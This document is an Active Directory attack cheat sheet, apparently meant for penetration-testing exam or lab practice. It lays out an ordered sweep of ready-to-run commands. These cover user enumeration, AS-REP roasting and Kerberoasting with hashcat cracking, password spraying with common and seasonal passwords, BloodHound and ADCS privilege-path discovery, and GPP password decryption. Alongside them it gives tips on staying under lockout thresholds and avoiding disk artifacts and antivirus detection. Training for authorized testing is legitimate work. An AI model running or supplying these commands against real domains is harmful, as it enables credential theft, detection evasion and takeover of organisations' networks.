The full enum sweep, in order. If you finish this list and don't have a path, you skipped something. Re-do, don't escalate. The decision point is always: do I have creds yet? — that determines which branch you're on.

▸ 0. CONTEXT — establish domain basics first
  • Domain name — nmcli dev show | grep DNS or cat /etc/resolv.conf or from nmap banner
  • DC IP — nslookup -type=SRV _ldap._tcp.<domain> or SMB/LDAP banner
  • Add to /etc/hosts — echo "<DC-IP> <domain> dc.<domain>" | sudo tee -a /etc/hosts
  • Set DOMAIN var — export DOMAIN=<domain>; export DC=<DC-IP>
▸ 1. UNAUTHENTICATED — before you have any creds
  • Full port scan on DC — sudo nmap -p- --min-rate 5000 -Pn $DC -oN scans/dc-tcp.txt
  • AD-specific ports — nmap -sC -sV -p53,88,135,139,389,445,464,593,636,3268,5985 $DC -oN scans/dc-svc.txt
  • SMB null — smbclient -L //$DC -N then smbclient //$DC/IPC$ -N
  • enum4linux-ng — enum4linux-ng -A $DC 2>/dev/null | tee scans/enum4linux.txt
  • LDAP anon bind — ldapsearch -x -H ldap://$DC -s base "(objectclass=*)" 2>/dev/null | tee scans/ldap-anon.txt
  • RPC null → user list — rpcclient -U "" -N $DC -c "enumdomusers" 2>/dev/null
  • RID brute (no creds) — nxc smb $DC -u '' -p '' --rid-brute 4000 2>/dev/null | grep "SidTypeUser"
  • Kerberos user enum — kerbrute userenum -d $DOMAIN /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc $DC
  • Save users list — extract usernames to users.txt, one per line
▸ 2. PRE-AUTH KERBEROS — run with users.txt, no password needed
  • AS-REP roast — impacket-GetNPUsers $DOMAIN/ -no-pass -usersfile users.txt -dc-ip $DC -format hashcat | tee scans/asrep.txt
  • Crack AS-REP hashes — hashcat -m 18200 scans/asrep.txt /usr/share/wordlists/rockyou.txt
  • Password spray (FIRST check lockout policy!) — nxc smb $DC -u users.txt -p 'Password123' --no-bruteforce
  • Spray seasonal patterns — nxc smb $DC -u users.txt -p 'Spring2024!','Summer2024!' --no-bruteforce
  • Username = password spray — nxc smb $DC -u users.txt -p users.txt --no-bruteforce
▸ 3. AUTHENTICATED — once you have user:pass
  • Validate + find local admin — nxc smb <subnet>/24 -u <user> -p <pwd> 2>/dev/null → look for Pwn3d!
  • Password policy — nxc smb $DC -u <user> -p <pwd> --pass-pol → note lockout threshold
  • Shares + spider — nxc smb $DC -u <user> -p <pwd> --shares then nxc smb $DC -u <user> -p <pwd> -M spider_plus
  • LDAP authed dump — ldapdomaindump -u "$DOMAIN\\<user>" -p "<pwd>" $DC -o ldap-dump/
  • windapsearch — windapsearch -m domain-admins --dc $DC -d $DOMAIN -u <user> -p <pwd>
  • Kerberoast — impacket-GetUserSPNs $DOMAIN/<user>:<pwd> -dc-ip $DC -request | tee scans/kerb.txt
  • Crack TGS hashes — hashcat -m 13100 scans/kerb.txt /usr/share/wordlists/rockyou.txt
  • BloodHound collect — bloodhound-python -c All -d $DOMAIN -u <user> -p <pwd> -ns $DC --zip 2>/dev/null
  • Upload zip to BloodHound → Analysis → Shortest Paths to Domain Admins
  • ADCS vulnerable templates — certipy find -u "<user>@$DOMAIN" -p "<pwd>" -dc-ip $DC -vulnerable 2>/dev/null | tee scans/adcs.txt
  • Domain trusts — nxc smb $DC -u <user> -p <pwd> -M enum_trusts
  • SYSVOL + GPP creds — nxc smb $DC -u <user> -p <pwd> -M gpp_password and -M gpp_autologin
  • Description field hunt — ldapsearch -x -H ldap://$DC -D "<user>@$DOMAIN" -w "<pwd>" -b "DC=<domain>" "(description=*)" description
▸ 4. SPRAY CADENCE — avoid lockout
  • Always check lockout before spraying — nxc smb $DC -u <user> -p <pwd> --pass-pol
  • 1 password per round · wait threshold × 2 minutes between rounds
  • After every new cred → rerun nxc sweep on /24 for Pwn3d! before anything else
budget: 30–45 min unauth · 45–60 min authed sweep
stuck = re-enumerate. bloodhound collects stale if you ran it before marking more nodes owned.
check lockout policy BEFORE every spray round — one bad round locks the whole domain
[ 01 ] DECISION FLOW · WHAT TO ENUM, WHEN
TRIGGER · "what do I do with this open port?"

The big picture: your enum approach branches on do I have creds?. Without creds, you're hunting for usernames (kerbrute, RID) and unauth shares. With creds, you go full sweep — BloodHound first, then targeted queries. Pre-auth Kerberos (AS-REP) is a free credless win — always run it.

[ ⚠ ] ANTI-PATTERNS · DON'T DO THIS
Skip kerbrute because you "already have a user list"
kerbrute validates which usernames actually exist in AD. enum4linux gives you guesses; kerbrute filters them. Always validate before spraying.
Spray passwords before checking lockout policy
cme smb <DC> -u U -p P --pass-pol first. Lock out a domain admin and you'll be debugging timeouts for 30 minutes.
Run SharpHound on a target Windows host
bloodhound-python from Kali through your pivot. No disk artifacts, no AV signature, faster.
Skip RID brute because SMB null "didn't return users"
SMB enum has different paths. rpcclient -U "" -N → lookupsids often works when enumdomusers fails. Try both.
Ignore the description field on user accounts
Half the time it contains "default password: Welcome2024". ldapdomaindump dumps these. Read every one.
Run BloodHound and not actually look at the data
Open Neo4j. Run "Find Shortest Path to Domain Admins" from owned. Pre-built queries answer 70% of "what now?" questions.
Skip ADCS enum because "it's complicated"
certipy find -vulnerable -u U -p P -dc-ip DC tells you in 5 seconds if there's an ESC1/ESC8 path to DA. One command.
Stop enumerating after foothold
First thing on a new host: cme smb localhost -u U -p P --shares, hunt unattend.xml, dump cmdkey. Foothold ≠ done with enum.
Read smbclient share listings, skip mounting them
Many shares list as "no access" but allow file reads on specific paths. Try smbclient //IP/Share -N directly. Sysvol especially.
Forget GPP cpassword in SYSVOL
It's 2008-era and still on exams. find /sysvol -name Groups.xml → gpp-decrypt. Free DA password sometimes.
